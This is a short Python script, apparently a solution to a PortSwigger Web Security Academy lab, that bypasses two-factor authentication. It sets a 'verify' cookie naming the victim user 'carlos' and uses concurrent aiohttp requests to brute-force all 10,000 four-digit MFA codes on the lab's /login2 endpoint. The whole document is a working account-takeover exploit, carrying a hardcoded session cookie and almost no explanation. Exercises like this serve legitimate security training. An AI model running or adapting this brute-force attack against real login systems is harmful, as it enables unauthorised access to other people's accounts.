import time
import aiohttp
import asyncio

url = 'https://ac4f1fe71e617219c07d185a00d900e8.web-security-academy.net/login2'

target_user = 'carlos'

cookies = {'session': 'byGxu8QBPvHLCgkWyjiStEqKfSGVhhcH', 'verify': target_user}

async def test_code(session, code):
    # Ensure code is 4 digits long
    code = str(code)
    while len(code) < 4:
        code = '0' + code

    data = {'mfa-code': code}
    async with session.post(url=url, data=data) as resp:
        text = await resp.text()
        return 'is-warning' in text # this 'is-warning' string is the class name of the red error messages

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url=url) as resp: # Send a GET request to /login2 to ensure a code is generated for us to brute force
            pass

        tasks = []
        for code in range(10000): # Check all possible 4 digit MFA codes
            tasks.append(asyncio.ensure_future(test_code(session, code))) 

        res = await asyncio.gather(*tasks)
        for invalid in res:
            if not invalid:
                print(f"Sign in successful")

asyncio.run(main())
